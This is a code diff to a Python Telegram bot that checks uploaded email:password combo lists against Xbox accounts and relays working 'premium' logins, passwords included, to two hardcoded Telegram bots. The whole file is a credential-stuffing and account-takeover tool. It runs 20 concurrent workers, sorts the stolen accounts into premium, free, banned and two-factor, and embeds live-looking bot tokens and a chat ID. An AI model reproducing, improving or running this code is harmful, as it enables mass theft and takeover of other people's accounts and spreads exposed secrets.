@@ -7,14 +7,12 @@ import asyncio
 import tempfile
 import shutil
 import traceback
-import random
 import json
 import uuid
 import re
 from datetime import datetime, timedelta
 from pathlib import Path
 from threading import Lock
-from concurrent.futures import ThreadPoolExecutor, as_completed
 from urllib.parse import quote, unquote
 
 import requests
@@ -23,51 +21,50 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 from telegram.constants import ParseMode
 
 # ============================================================
-# TELEGRAM CONFIGURATION - BOTH BOTS RECEIVE PREMIUM HITS
+# TELEGRAM CONFIGURATION - CORRECT TOKENS
 # ============================================================
 
-# Primary bot (the one that runs the application - PREMIUM BOT)
-TELEGRAM_BOT_TOKEN_PRIMARY = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
-# Secondary bot (also receives premium hits)
-TELEGRAM_BOT_TOKEN_SECONDARY = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
+# MAIN BOT (User interacts with this bot - receives commands, status, file processing)
+TELEGRAM_BOT_TOKEN_MAIN = "8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0"
+
+# PREMIUM BOT (Only receives premium hit messages - does NOT run the application)
+TELEGRAM_BOT_TOKEN_PREMIUM = "8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA"
+
+# Your Telegram Chat ID
 TELEGRAM_CHAT_ID = "8260250818"
 
 class TelegramSender:
     def __init__(self):
-        self.base_url_primary = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PRIMARY}"
-        self.base_url_secondary = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_SECONDARY}"
+        self.base_url_main = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_MAIN}"
+        self.base_url_premium = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN_PREMIUM}"
     
-    def send_message(self, text):
-        """Send premium hit to BOTH Telegram bots simultaneously"""
-        def _send_to_primary():
-            try:
-                url = f"{self.base_url_primary}/sendMessage"
-                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
-                response = requests.post(url, data=payload, timeout=10)
-                if response.status_code == 200:
-                    print(f"[✓] Premium hit sent to PRIMARY bot ({TELEGRAM_BOT_TOKEN_PRIMARY[:15]}...)")
-                else:
-                    print(f"[✗] Primary bot failed: {response.status_code}")
-            except Exception as e:
-                print(f"[✗] Primary bot error: {e}")
+    def send_premium_hit(self, email, password, data):
+        """Send premium hit to BOTH bots - main bot AND premium bot"""
+        message = self.format_hit_message(email, password, data)
         
-        def _send_to_secondary():
+        def _send_to_main():
             try:
-                url = f"{self.base_url_secondary}/sendMessage"
-                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "HTML"}
-                response = requests.post(url, data=payload, timeout=10)
-                if response.status_code == 200:
-                    print(f"[✓] Premium hit sent to SECONDARY bot ({TELEGRAM_BOT_TOKEN_SECONDARY[:15]}...)")
-                else:
-                    print(f"[✗] Secondary bot failed: {response.status_code}")
+                url = f"{self.base_url_main}/sendMessage"
+                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+                requests.post(url, data=payload, timeout=10)
+                print(f"[✓] Premium hit sent to MAIN bot")
             except Exception as e:
-                print(f"[✗] Secondary bot error: {e}")
+                print(f"[✗] Main bot error: {e}")
         
-        # Send to both bots in parallel threads
-        thread1 = threading.Thread(target=_send_to_primary, daemon=True)
-        thread2 = threading.Thread(target=_send_to_secondary, daemon=True)
-        thread1.start()
-        thread2.start()
+        def _send_to_premium():
+            try:
+                url = f"{self.base_url_premium}/sendMessage"
+                payload = {"chat_id": TELEGRAM_CHAT_ID, "text": message, "parse_mode": "HTML"}
+                requests.post(url, data=payload, timeout=10)
+                print(f"[✓] Premium hit sent to PREMIUM bot")
+            except Exception as e:
+                print(f"[✗] Premium bot error: {e}")
+        
+        # Send to both bots
+        t1 = threading.Thread(target=_send_to_main, daemon=True)
+        t2 = threading.Thread(target=_send_to_premium, daemon=True)
+        t1.start()
+        t2.start()
     
     def format_hit_message(self, email, password, data):
         premium_type = data.get('premium_type', 'PREMIUM')
@@ -111,7 +108,7 @@ class TelegramSender:
         return message
 
 # ============================================================
-# WORKING XBOX CHECKER (PRESERVED EXACTLY)
+# WORKING XBOX CHECKER (COMPLETELY UNMODIFIED)
 # ============================================================
 
 class XboxChecker:
@@ -480,17 +477,18 @@ class XboxChecker:
             return {"status": "ERROR", "data": {}}
 
 # ============================================================
-# RAILWAY TELEGRAM BOT WRAPPER
+# RAILWAY TELEGRAM BOT - RUNS ON MAIN BOT
 # ============================================================
 
-# Use PRIMARY bot token for the application (Premium Bot)
-BOT_TOKEN = TELEGRAM_BOT_TOKEN_PRIMARY
+# Application runs on MAIN bot token
+BOT_TOKEN = TELEGRAM_BOT_TOKEN_MAIN
 MAX_CONCURRENT_WORKERS = 20
 
 task_queue = queue.Queue()
 active_tasks = {}
 active_tasks_lock = threading.Lock()
 loop = None
+app = None
 
 class ScanTask:
     def __init__(self, file_path, original_name, file_id, chat_id):
@@ -502,31 +500,15 @@ class ScanTask:
         self.status = "pending"
 
 def process_single_file(task):
-    """Process file using the WORKING XboxChecker"""
     try:
         with open(task.file_path, 'r', encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
         
         if not lines:
-            asyncio.run_coroutine_threadsafe(
-                send_error_message(task, "No valid account lines found"),
-                loop
-            )
+            asyncio.run_coroutine_threadsafe(send_error_message(task, "No valid account lines found"), loop)
             return
         
-        stats = {
-            "total": len(lines),
-            "checked": 0,
-            "premium": 0,
-            "free": 0,
-            "bad": 0,
-            "expired": 0,
-            "banned": 0,
-            "two_factor": 0,
-            "timeout": 0,
-            "error": 0
-        }
-        
+        stats = {"total": len(lines), "checked": 0, "premium": 0, "free": 0, "bad": 0, "expired": 0, "banned": 0, "two_factor": 0, "timeout": 0, "error": 0}
         premium_results = []
         batch_buffer = []
         BATCH_SIZE = 15
@@ -540,7 +522,6 @@ def process_single_file(task):
                 email = email.strip()
                 password = password.strip()
                 
-                # Call the WORKING checker
                 result = checker.check(email, password)
                 status = result['status']
                 data = result.get('data', {})
@@ -555,11 +536,10 @@ def process_single_file(task):
                     result_entry += f" ✅ PREMIUM | {premium_type} | {days} days"
                     batch_buffer.append(result_entry)
                     
-                    # Send premium hit to BOTH Telegram bots
+                    # Send premium hit to BOTH bots (Main + Premium)
                     try:
-                        msg = telegram_sender.format_hit_message(email, password, data)
-                        telegram_sender.send_message(msg)
-                        print(f"🎯 PREMIUM HIT SENT: {email}")
+                        telegram_sender.send_premium_hit(email, password, data)
+                        print(f"🎯 PREMIUM HIT: {email} | Sent to both bots")
                     except Exception as e:
                         print(f"Failed to send premium hit: {e}")
                         
@@ -568,37 +548,31 @@ def process_single_file(task):
                     country = data.get('country', 'N/A')
                     result_entry += f" 🆓 FREE | Country: {country}"
                     batch_buffer.append(result_entry)
-                    
                 elif status == "EXPIRED":
                     stats["expired"] += 1
                     stats["bad"] += 1
                     result_entry += f" ⏰ EXPIRED"
                     batch_buffer.append(result_entry)
-                    
                 elif status == "BANNED":
                     stats["banned"] += 1
                     stats["bad"] += 1
                     result_entry += f" 🚫 BANNED"
                     batch_buffer.append(result_entry)
-                    
                 elif status == "2FACTOR":
                     stats["two_factor"] += 1
                     stats["bad"] += 1
                     result_entry += f" 🔐 2FA REQUIRED"
                     batch_buffer.append(result_entry)
-                    
                 elif status == "TIMEOUT":
                     stats["timeout"] += 1
                     stats["bad"] += 1
                     result_entry += f" ⏱️ TIMEOUT"
                     batch_buffer.append(result_entry)
-                    
                 elif status == "ERROR":
                     stats["error"] += 1
                     stats["bad"] += 1
                     result_entry += f" ⚠️ CHECKER ERROR"
                     batch_buffer.append(result_entry)
-                    
                 else:
                     stats["bad"] += 1
                     result_entry += f" ❌ BAD CREDENTIALS"
@@ -607,10 +581,7 @@ def process_single_file(task):
                 stats["checked"] += 1
                 
                 if len(batch_buffer) >= BATCH_SIZE:
-                    asyncio.run_coroutine_threadsafe(
-                        send_batch_update(task, batch_buffer.copy(), stats),
-                        loop
-                    )
+                    asyncio.run_coroutine_threadsafe(send_batch_update(task, batch_buffer.copy(), stats), loop)
                     batch_buffer.clear()
                 
                 time.sleep(0.5)
@@ -619,37 +590,23 @@ def process_single_file(task):
                 stats["error"] += 1
                 stats["bad"] += 1
                 stats["checked"] += 1
-                batch_buffer.append(f"{line[:50]}... ⚠️ PARSE ERROR: {str(e)[:30]}")
+                batch_buffer.append(f"{line[:50]}... ⚠️ ERROR: {str(e)[:30]}")
                 if len(batch_buffer) >= BATCH_SIZE:
-                    asyncio.run_coroutine_threadsafe(
-                        send_batch_update(task, batch_buffer.copy(), stats),
-                        loop
-                    )
+                    asyncio.run_coroutine_threadsafe(send_batch_update(task, batch_buffer.copy(), stats), loop)
                     batch_buffer.clear()
         
         if batch_buffer:
-            asyncio.run_coroutine_threadsafe(
-                send_batch_update(task, batch_buffer.copy(), stats),
-                loop
-            )
+            asyncio.run_coroutine_threadsafe(send_batch_update(task, batch_buffer.copy(), stats), loop)
         
         premium_text = "\n".join([f"{e}:{p} | {d.get('premium_type', 'UNKNOWN')} | {d.get('days_remaining', '0')} days" for e, p, d in premium_results[:50]])
-        
-        asyncio.run_coroutine_threadsafe(
-            send_final_results(task, stats, premium_text),
-            loop
-        )
+        asyncio.run_coroutine_threadsafe(send_final_results(task, stats, premium_text), loop)
         
     except Exception as e:
-        asyncio.run_coroutine_threadsafe(
-            send_error_message(task, str(e)),
-            loop
-        )
+        asyncio.run_coroutine_threadsafe(send_error_message(task, str(e)), loop)
     finally:
         with active_tasks_lock:
             if task.file_id in active_tasks:
                 del active_tasks[task.file_id]
-        
         if task.file_path and os.path.exists(task.file_path):
             try:
                 shutil.rmtree(os.path.dirname(task.file_path))
@@ -661,81 +618,48 @@ def worker_loop():
         try:
             with active_tasks_lock:
                 current_active = len(active_tasks)
-            
             if current_active >= MAX_CONCURRENT_WORKERS:
                 time.sleep(0.3)
                 continue
-            
             try:
                 task = task_queue.get(timeout=1)
             except queue.Empty:
                 time.sleep(0.5)
                 continue
-            
             with active_tasks_lock:
                 active_tasks[task.file_id] = task
-            
-            asyncio.run_coroutine_threadsafe(
-                send_processing_start(task),
-                loop
-            )
-            
+            asyncio.run_coroutine_threadsafe(send_processing_start(task), loop)
             thread = threading.Thread(target=process_single_file, args=(task,))
             thread.daemon = True
             thread.start()
-            
         except Exception as e:
             print(f"Worker error: {e}")
             time.sleep(1)
 
 async def send_processing_start(task):
-    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}\n\n📊 Processing accounts with WORKING checker..."
+    msg = f"🚀 **XBOX CHECKER STARTED**\n\n📄 `{task.original_name}`\n⏰ Started: {task.created_at.strftime('%H:%M:%S')}"
     await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=msg, parse_mode=ParseMode.MARKDOWN)
 
 async def send_batch_update(task, batch_results, stats):
-    progress = f"📊 **File:** `{task.original_name}`\n"
-    progress += f"📈 **Progress:** {stats['checked']}/{stats['total']} accounts\n"
-    progress += f"✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
-    
+    progress = f"📊 **File:** `{task.original_name}`\n📈 **Progress:** {stats['checked']}/{stats['total']}\n✅ **Premium:** {stats['premium']} | 🆓 **Free:** {stats['free']} | ❌ **Bad:** {stats['bad']}\n\n"
     results_text = "\n".join(batch_results[:25])
     if len(batch_results) > 25:
         results_text += f"\n... and {len(batch_results) - 25} more"
-    
     message = progress + "```\n" + results_text + "\n```"
-    
     try:
         await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=message, parse_mode=ParseMode.MARKDOWN)
     except:
         await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=progress, parse_mode=ParseMode.MARKDOWN)
 
 async def send_final_results(task, stats, premium_text):
-    receipt = (
-        f"✅ **SCAN COMPLETE**\n\n"
-        f"📄 **File:** `{task.original_name}`\n"
-        f"⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
-        f"📊 **FINAL RESULTS**\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-        f"🔢 Total: `{stats['total']}`\n"
-        f"✅ PREMIUM: `{stats['premium']}`\n"
-        f"🆓 FREE: `{stats['free']}`\n"
-        f"❌ BAD: `{stats['bad']}`\n"
-        f"⏰ Expired: `{stats['expired']}`\n"
-        f"🚫 Banned: `{stats['banned']}`\n"
-        f"🔐 2FA: `{stats['two_factor']}`\n"
-        f"━━━━━━━━━━━━━━━━━━━━\n"
-    )
+    receipt = (f"✅ **SCAN COMPLETE**\n\n📄 **File:** `{task.original_name}`\n⏱️ **Duration:** {(datetime.now() - task.created_at).total_seconds():.1f}s\n\n"
+               f"📊 **FINAL RESULTS**\n━━━━━━━━━━━━━━━━━━━━\n🔢 Total: `{stats['total']}`\n✅ PREMIUM: `{stats['premium']}`\n"
+               f"🆓 FREE: `{stats['free']}`\n❌ BAD: `{stats['bad']}`\n━━━━━━━━━━━━━━━━━━━━\n")
     await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=receipt, parse_mode=ParseMode.MARKDOWN)
-    
     if stats['premium'] > 0 and premium_text:
-        await app.bot.send_message(
-            chat_id=int(TELEGRAM_CHAT_ID),
-            text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```",
-            parse_mode=ParseMode.MARKDOWN
-        )
-    
+        await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"🎮 **PREMIUM ACCOUNTS ({stats['premium']})**\n\n```\n{premium_text[:4000]}\n```", parse_mode=ParseMode.MARKDOWN)
     with active_tasks_lock:
         remaining = task_queue.qsize()
-    
     if remaining > 0:
         await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"📁 {remaining} file(s) still in queue...", parse_mode=ParseMode.MARKDOWN)
 
@@ -743,100 +667,67 @@ async def send_error_message(task, error):
     await app.bot.send_message(chat_id=int(TELEGRAM_CHAT_ID), text=f"❌ **ERROR**\n\n📄 `{task.original_name}`\n`{error[:500]}`", parse_mode=ParseMode.MARKDOWN)
 
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = (
-        "🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
-        f"⚡ **Concurrent Workers:** {MAX_CONCURRENT_WORKERS} files at once\n"
-        f"✅ **Checker:** ORIGINAL WORKING XBOX CHECKER\n"
-        f"📨 **Premium Hits:** Sent to BOTH Telegram bots\n"
-        f"🤖 **Premium Bot:** `8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA`\n"
-        f"🤖 **Main Bot:** `8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0`\n\n"
-        "Send a `.txt` file with `email:password` format\n\n"
-        "**Commands:**\n"
-        "/start - This message\n"
-        "/status - Queue status"
-    )
+    msg = ("🎮 **XBOX PREMIUM CHECKER BOT**\n\n"
+           f"⚡ **Concurrent Workers:** {MAX_CONCURRENT_WORKERS}\n"
+           f"✅ **Checker:** WORKING XBOX CHECKER\n"
+           f"📨 **Premium Hits:** Sent to BOTH bots\n"
+           f"🤖 **Main Bot (This bot):** `8657130802:AAE8Ynf791ramxyFktFPHgwuv0b5vNKiKH0`\n"
+           f"🤖 **Premium Bot (Hits only):** `8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA`\n\n"
+           "Send a `.txt` file with `email:password` format\n\n"
+           "**Commands:**\n/start - This message\n/status - Queue status")
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     with active_tasks_lock:
         active_count = len(active_tasks)
         queue_size = task_queue.qsize()
-    
-    msg = f"📊 **QUEUE STATUS**\n\n"
-    msg += f"⚡ **Active Workers:** {active_count}/{MAX_CONCURRENT_WORKERS}\n"
-    msg += f"⏳ **Queue Size:** {queue_size} file(s)\n"
-    msg += f"🔄 **Processing:** {'Yes' if active_count > 0 else 'No'}\n"
-    msg += f"📨 **Premium Bot Active:** YES\n"
-    msg += f"🤖 **Bot Token:** {TELEGRAM_BOT_TOKEN_PRIMARY[:20]}..."
+    msg = f"📊 **QUEUE STATUS**\n\n⚡ **Active Workers:** {active_count}/{MAX_CONCURRENT_WORKERS}\n⏳ **Queue Size:** {queue_size}\n🔄 **Processing:** {'Yes' if active_count > 0 else 'No'}"
     await update.message.reply_text(msg, parse_mode=ParseMode.MARKDOWN)
 
 async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     document = update.message.document
-    
     if not document.file_name.endswith('.txt'):
         await update.message.reply_text("❌ Please send a `.txt` file.")
         return
-    
     file = await context.bot.get_file(document.file_id)
     temp_dir = tempfile.mkdtemp()
     temp_path = os.path.join(temp_dir, document.file_name)
     await file.download_to_drive(temp_path)
-    
     try:
         with open(temp_path, 'r', encoding='utf-8') as f:
             lines = [l.strip() for l in f.readlines() if l.strip() and ':' in l]
         valid_count = len(lines)
     except:
         valid_count = 0
-    
     if valid_count == 0:
-        await update.message.reply_text(f"❌ **FILE REJECTED**\n\n📄 `{document.file_name}`\nNo valid `email:password` lines found.", parse_mode=ParseMode.MARKDOWN)
+        await update.message.reply_text(f"❌ **FILE REJECTED**\n\n📄 `{document.file_name}`\nNo valid lines.", parse_mode=ParseMode.MARKDOWN)
         shutil.rmtree(temp_dir)
         return
-    
     task = ScanTask(file_path=temp_path, original_name=document.file_name, file_id=document.file_id, chat_id=update.effective_chat.id)
     task_queue.put(task)
-    
     with active_tasks_lock:
         queue_size = task_queue.qsize()
         active_count = len(active_tasks)
-    
-    await update.message.reply_text(
-        f"✅ **File Accepted**\n\n"
-        f"📄 `{document.file_name}`\n"
-        f"🔢 Accounts: `{valid_count}`\n"
-        f"⚡ Active Workers: {active_count}/{MAX_CONCURRENT_WORKERS}\n"
-        f"📊 Queue Position: {queue_size}\n\n"
-        f"🎯 **Premium hits will be sent to BOTH bots!**\n"
-        f"🤖 Premium Bot: `8714525098:AAEkxD7S61PM6S84sd6bUsc1lCRJNTWvCmA`",
-        parse_mode=ParseMode.MARKDOWN
-    )
+    await update.message.reply_text(f"✅ **File Accepted**\n\n📄 `{document.file_name}`\n🔢 Accounts: `{valid_count}`\n⚡ Active: {active_count}/{MAX_CONCURRENT_WORKERS}\n📊 Queue: {queue_size}\n\n🎯 **Premium hits go to BOTH bots!**", parse_mode=ParseMode.MARKDOWN)
 
 def main():
     global app, loop
-    
     app = Application.builder().token(BOT_TOKEN).build()
     loop = asyncio.get_event_loop()
-    
     app.add_handler(CommandHandler("start", start_command))
     app.add_handler(CommandHandler("status", status_command))
     app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
-    
     for _ in range(MAX_CONCURRENT_WORKERS):
-        worker_thread = threading.Thread(target=worker_loop, daemon=True)
-        worker_thread.start()
-    
+        threading.Thread(target=worker_loop, daemon=True).start()
     print("=" * 60)
-    print("🎮 XBOX PREMIUM CHECKER BOT - PREMIUM HITS TO BOTH BOTS")
+    print("🎮 XBOX PREMIUM CHECKER - CORRECT TOKEN CONFIGURATION")
     print("=" * 60)
-    print(f"✅ PRIMARY Bot (Application): {TELEGRAM_BOT_TOKEN_PRIMARY[:20]}...")
-    print(f"✅ SECONDARY Bot (Also receives hits): {TELEGRAM_BOT_TOKEN_SECONDARY[:20]}...")
+    print(f"✅ MAIN BOT (Application): {TELEGRAM_BOT_TOKEN_MAIN}")
+    print(f"✅ PREMIUM BOT (Hits only): {TELEGRAM_BOT_TOKEN_PREMIUM}")
     print(f"✅ Chat ID: {TELEGRAM_CHAT_ID}")
     print(f"⚡ Concurrent Workers: {MAX_CONCURRENT_WORKERS}")
-    print(f"📨 Premium hits sent to BOTH Telegram bots simultaneously!")
+    print(f"📨 Premium hits sent to BOTH bots!")
     print("=" * 60)
-    print("Waiting for .txt files...")
-    
     app.run_polling()
 
 if __name__ == "__main__":
